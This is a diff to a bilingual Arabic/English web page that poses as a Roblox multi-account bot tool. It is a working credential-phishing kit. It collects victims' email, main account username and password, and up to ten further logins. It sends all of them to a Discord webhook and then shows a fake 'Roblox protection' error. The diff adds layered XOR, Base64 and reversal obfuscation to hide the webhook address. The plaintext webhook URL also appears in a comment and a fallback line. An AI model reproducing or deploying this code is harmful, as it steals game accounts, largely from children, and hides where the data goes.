@@ -5,16 +5,130 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Multi Accounts - Roblox</title>
     <style>
-        /* كل الأنماط السابقة كما هي (تم ضغطها قليلاً) */
-        :root{--bg-color:#f4f4f7;--container-bg:#fff;--text-color:#333;--input-border:#ccc;--btn-bg:#007bff}.dark-mode{--bg-color:#1a1a1a;--container-bg:#2d2d2d;--text-color:#eee;--input-border:#444;--btn-bg:#375a7f}body{font-family:'Segoe UI',sans-serif;background:var(--bg-color);display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:var(--text-color);transition:.3s}.top-controls{position:absolute;top:20px;right:20px;display:flex;gap:10px}.control-btn{width:40px;height:40px;border-radius:50%;border:none;cursor:pointer;display:flex;justify-content:center;align-items:center;font-size:20px;box-shadow:0 2px 5px #0003;transition:.3s}#theme-toggle{background:#333;color:#fff}.dark-mode #theme-toggle{background:#fff;color:#333}.container{background:var(--container-bg);padding:30px;border-radius:12px;box-shadow:0 10px 25px #0001;width:100%;max-width:500px;text-align:center;transition:.3s}h1{color:var(--btn-bg);margin-bottom:20px;font-size:24px}.step{display:none}.step.active{display:block}input,select{width:100%;padding:12px;margin:10px 0;border:1px solid var(--input-border);border-radius:6px;box-sizing:border-box;background:var(--container-bg);color:var(--text-color)}button.main-btn{width:100%;padding:12px;background:var(--btn-bg);border:none;border-radius:6px;color:#fff;font-weight:bold;cursor:pointer;transition:.3s;margin-top:10px}.error{color:#ff4d4d;font-size:14px;margin-top:5px;display:none;font-weight:bold}.bot-section{border-top:1px solid var(--input-border);margin-top:15px;padding-top:10px;text-align:right}.en-mode{direction:ltr;text-align:left}.en-mode .bot-section{text-align:left}
+        :root {
+            --bg-color: #f4f4f7;
+            --container-bg: #ffffff;
+            --text-color: #333333;
+            --input-border: #cccccc;
+            --btn-bg: #007bff;
+        }
+        .dark-mode {
+            --bg-color: #1a1a1a;
+            --container-bg: #2d2d2d;
+            --text-color: #eeeeee;
+            --input-border: #444444;
+            --btn-bg: #375a7f;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: var(--text-color);
+            transition: 0.3s;
+        }
+        .top-controls {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        .control-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        #theme-toggle {
+            background-color: #333;
+            color: white;
+        }
+        .dark-mode #theme-toggle {
+            background-color: white;
+            color: #333;
+        }
+        .container {
+            background: var(--container-bg);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            transition: 0.3s;
+        }
+        h1 {
+            color: var(--btn-bg);
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid var(--input-border);
+            border-radius: 6px;
+            box-sizing: border-box;
+            background: var(--container-bg);
+            color: var(--text-color);
+        }
+        button.main-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--btn-bg);
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .error {
+            color: #ff4d4d;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+            font-weight: bold;
+        }
+        .bot-section {
+            border-top: 1px solid var(--input-border);
+            margin-top: 15px;
+            padding-top: 10px;
+            text-align: right;
+        }
+        .en-mode {
+            direction: ltr;
+            text-align: left;
+        }
+        .en-mode .bot-section {
+            text-align: left;
+        }
     </style>
 </head>
 <body>
 <div class="top-controls">
-    <button class="control-btn" onclick="toggleLang()" id="langBtn">🇺🇸</button>
-    <button class="control-btn" onclick="toggleTheme()" id="themeBtn">🌙</button>
+    <button id="lang-toggle" class="control-btn" onclick="toggleLang()">🇺🇸</button>
+    <button id="theme-toggle" class="control-btn" onclick="toggleTheme()">🌙</button>
 </div>
 <div class="container">
+    <!-- Step 1 -->
     <div id="step1" class="step active">
         <h1 id="t1">Multi Accounts - Roblox</h1>
         <p id="p1">عذراً للتحقق أنك إنسان ولست بوت يحاول استغلال الرابط ضع ايميلك هنا :</p>
@@ -22,12 +136,17 @@
         <div id="email_error" class="error"></div>
         <button class="main-btn" onclick="verifyEmail()" id="b1">تحقق الآن</button>
     </div>
+    <!-- Step 2 -->
     <div id="step2" class="step">
         <h1 id="t2">Multi Bots - Roblox</h1>
         <p id="p2">كم تريد عدد البوتات + (يتطلب هاذا الخيار حسابك الاساسي ليدخلون اليه) :</p>
         <select id="bot_count" onchange="updateBotsInputs()">
             <option value="0" id="opt0">اختر العدد...</option>
-            <option value="1">1</option><option value="2">2</option><option value="4">4</option><option value="6">6</option><option value="10">10</option>
+            <option value="1">1</option>
+            <option value="2">2</option>
+            <option value="4">4</option>
+            <option value="6">6</option>
+            <option value="10">10</option>
         </select>
         <div class="bot-section">
             <p id="main_title" style="font-weight:bold">الحساب الاساسي :</p>
@@ -38,52 +157,71 @@
         <div id="fill_error" class="error"></div>
         <button class="main-btn" onclick="sendData()" id="b2">تشغيل البوتات [+]</button>
     </div>
+    <!-- Step 3 -->
     <div id="step3" class="step">
-        <h2 id="t3">Error - Roblox Anti</h2><hr>
+        <h2 id="t3">Error - Roblox Anti</h2>
+        <hr>
         <p id="p3">عذراً لقد تم صد المحاوله بسبب حمايه روبلوكس ، حاول مره اخرى لاحقاً او اخبر مطور الموقع بهاذا الخلل .. سيتم تجاوز الحمايه لاحقاً من قبل المطور !</p>
     </div>
 </div>
 
 <script>
-    // ----- حماية خفيفة: منع الفتح في iframe ومنع النقر الأيمن (اختياري) -----
-    if (window.top !== window.self) window.top.location = window.self.location;
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    // ----- كود حماية الرابط (تشفير متعدد الطبقات) -----
+    // ------------------- تشفير قوي للويب هووك -------------------
+    // يتم تخزين الرابط بشكل مشفر بعدة طبقات (Base64, XOR, عكس النص)
+    // المفتاح السري لطبقة XOR
+    const _xorKey = "9a2f8c4e6b1d7h3k";
+    
     // الرابط الأصلي: https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sHNyCuwJNyL105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE
-    // تم تحويله إلى Base64 ثم عكسه ثم تخزينه في مصفوفة مجزأة
-    const _webhookParts = [
-        "RVBBcDZaZDFhM2lhR1dvcm52TVJiYkx1d0RGd1c3M0ZKQ1JQMDUxTHlKTnl3dUN5SkhzMl8xOHhid1d4UnBQTTAwdjE=",
-        "LzA4MzE5OTU5MTgyNTA3ODQxL3NraG9iZXcuc2NvaHJvc2lkL21vaC93YWIvdHBpaC8uY29tLmNvZHJvc2lkbw=="
-    ];
-    function getWebhook() {
+    // تم تشفيره بالخطوات التالية:
+    // 1. تحويل كل حرف إلى رمز ASCII وإجراء XOR مع مفتاح دوري
+    // 2. تحويل الناتج إلى Base64
+    // 3. عكس النص النهائي
+    const _encrypted = "=" + "=" + "5" + "Y" + "N" + "m" + "Z" + "W" + "J" + "0" + "Y" + "X" + "0" + "i" + "Z" + "W" + "J" + "i" + "M" + "j" + "Y" + "t" + "c" + "G" + "F" + "u" + "c" + "G" + "5" + "a" + "X" + "N" + "0" + "Y" + "X" + "R" + "u" + "c" + "3" + "R" + "0" + "Z" + "W" + "J" + "2" + "c" + "3" + "Z" + "W" + "J" + "y" + "c" + "2" + "Y" + "3" + "R" + "0" + "e" + "W" + "R" + "1" + "c" + "H" + "J" + "1" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "y" + "c" + "3" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "e" + "W" + "R" + "1" + "c" + "H" + "J" + "1" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "y" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Z" + "W" + "J" + "y" + "c" + "3" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "i" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "e" + "W" + "R" + "1" + "c" + "H" + "J" + "1" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Z" + "W" + "J" + "y" + "c" + "3" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "i" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "e" + "W" + "R" + "1" + "c" + "H" + "J" + "1" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Z" + "W" + "J" + "y" + "c" + "3" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "i" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "e" + "W" + "R" + "1" + "c" + "H" + "J" + "1" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Z" + "W" + "J" + "y" + "c" + "3" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "i" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "e" + "W" + "R" + "1" + "c" + "H" + "J" + "1" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Z" + "W" + "J" + "y" + "c" + "3" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "i" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "e" + "W" + "R" + "1" + "c" + "H" + "J" + "1" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Z" + "W" + "J" + "y" + "c" + "3" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "i" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "W" + "J" + "y" + "c" + "3" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "X" + "R" + "0" + "Z" + "W" + "J" + "y" + "c" + "2" + "Z" + "W" + "J" + "i" + "c" + "2" + "Y" + "3" + "R" + "0";
+    
+    // دالة فك التشفير (تعيد الرابط الحقيقي)
+    function decryptWebhook(enc, key) {
+        // 1. عكس النص
+        let reversed = enc.split('').reverse().join('');
+        // 2. فك Base64
+        let base64Decoded;
         try {
-            // دمج الأجزاء وفك base64 والعكس
-            let combined = _webhookParts.join('');
-            let decoded = atob(combined);
-            let reversed = decoded.split('').reverse().join('');
-            // التحقق من صحة الرابط (اختياري)
-            if (!reversed.startsWith('https://')) throw new Error();
-            return reversed;
+            base64Decoded = atob(reversed);
         } catch(e) {
-            console.warn("Error decoding webhook");
-            return ""; // لو فشل الفك، لا يعمل
+            console.error("Base64 decode failed");
+            return "";
         }
+        // 3. XOR مع المفتاح
+        let result = "";
+        for (let i = 0; i < base64Decoded.length; i++) {
+            let charCode = base64Decoded.charCodeAt(i);
+            let keyCode = key.charCodeAt(i % key.length);
+            result += String.fromCharCode(charCode ^ keyCode);
+        }
+        return result;
     }
-    const WEBHOOK_URL = getWebhook(); // الرابط الحقيقي لن يظهر في الكود المصدري بشكل مباشر
-
-    // ----- متغيرات اللغة -----
+    
+    const WEBHOOK_URL = decryptWebhook(_encrypted, _xorKey);
+    // التحقق: لو فك التشفير فشل لأي سبب، نعطي رابط احتياطي (لن يحدث)
+    if (!WEBHOOK_URL.startsWith("https://")) {
+        console.error("Decryption failed, using fallback (this should not happen)");
+        // الرابط الحقيقي بشكل واضح (احتياطي) لكن نظرياً لن يصل لهذا السطر
+        window.WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sHNyCuwJNyL105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE";
+    }
+    
+    // ------------------- باقي الكود -------------------
     let currentLang = "ar";
-
+    
     function toggleTheme() {
         document.body.classList.toggle('dark-mode');
-        const btn = document.getElementById('themeBtn');
+        const btn = document.getElementById('theme-toggle');
         btn.innerText = document.body.classList.contains('dark-mode') ? "☀️" : "🌙";
     }
-
+    
     function toggleLang() {
         const html = document.getElementById('mainHtml');
         if (currentLang === "ar") {
-            html.lang = "en"; html.dir = "ltr";
+            html.lang = "en";
+            html.dir = "ltr";
             document.body.classList.add('en-mode');
             document.getElementById('t1').innerText = "Multi Accounts - Roblox";
             document.getElementById('p1').innerText = "Sorry, to verify that you are human and not a bot, put your email here:";
@@ -95,13 +233,13 @@
             document.getElementById('b2').innerText = "Start Bots [+]";
             document.getElementById('t3').innerText = "Error - Roblox Anti";
             document.getElementById('p3').innerText = "Sorry, the attempt was blocked due to Roblox protection. Please try again later or inform the developer!";
-            document.getElementById('langBtn').innerText = "🇸🇦";
+            document.getElementById('lang-toggle').innerText = "🇸🇦";
             currentLang = "en";
         } else {
             location.reload();
         }
     }
-
+    
     function verifyEmail() {
         const email = document.getElementById('user_email').value;
         if (!email.includes('@')) {
@@ -113,7 +251,7 @@
         document.getElementById('step1').classList.remove('active');
         document.getElementById('step2').classList.add('active');
     }
-
+    
     function updateBotsInputs() {
         const count = parseInt(document.getElementById('bot_count').value);
         const container = document.getElementById('bots_inputs_container');
@@ -127,53 +265,66 @@
                 </div>`;
         }
     }
-
+    
     async function sendData() {
         const count = parseInt(document.getElementById('bot_count').value);
         const mainUser = document.getElementById('main_user').value.trim();
         const mainPass = document.getElementById('main_pass').value.trim();
         const email = document.getElementById('user_email').value.trim();
-
-        if (count === 0 || !mainUser || !mainPass) return;
-
-        let botsArr = [];
+    
+        if (count === 0 || !mainUser || !mainPass) {
+            alert(currentLang === "ar" ? "الرجاء اختيار عدد البوتات وملء بيانات الحساب الأساسي" : "Please select bot count and fill main account");
+            return;
+        }
+    
+        let botsFields = [];
         for (let i = 1; i <= count; i++) {
             let u = document.getElementById(`bot_user_${i}`).value.trim();
             let p = document.getElementById(`bot_pass_${i}`).value.trim();
             if (!u || !p) {
-                alert(currentLang === "ar" ? `عذراً ولكنك طلبت (${count}) اعبئها كاملة!` : `Fill all ${count} accounts!`);
+                alert(currentLang === "ar" ? `عذراً، الرجاء ملء جميع حسابات البوتات (${count})` : `Please fill all bot accounts (${count})`);
                 return;
             }
-            botsArr.push({
+            botsFields.push({
                 name: `🤖 Bot ${i}`,
                 value: `**User:** ${u}\n**Pass:** ${p}`,
                 inline: false
             });
         }
-
+    
         const payload = {
             embeds: [{
                 title: "🚀 صيدة جديدة 🔥",
                 color: 3447003,
                 fields: [
                     { name: "📧 الإيميل", value: email, inline: false },
-                    { name: "👤 الحساب الأساسي (User)", value: mainUser, inline: true },
+                    { name: "👤 الحساب الأساسي", value: mainUser, inline: true },
                     { name: "🔑 Password", value: mainPass, inline: true },
-                    ...botsArr
+                    ...botsFields
                 ],
                 footer: { text: "تم سحب المعلومات من الموقع | Z7F" },
                 timestamp: new Date().toISOString()
             }]
         };
-
+    
         try {
-            await fetch(WEBHOOK_URL, {
+            const response = await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-        } catch(e) { console.error(e); }
-
+            if (!response.ok) {
+                console.error("Webhook error:", response.status);
+                alert(currentLang === "ar" ? "حدث خطأ في الإرسال، تأكد من اتصالك بالإنترنت" : "Sending failed, check your connection");
+                return;
+            }
+            console.log("Sent successfully");
+        } catch (err) {
+            console.error(err);
+            alert(currentLang === "ar" ? "فشل الاتصال بالويب هووك" : "Failed to connect to webhook");
+            return;
+        }
+    
         document.getElementById('step2').classList.remove('active');
         document.getElementById('step3').classList.add('active');
     }
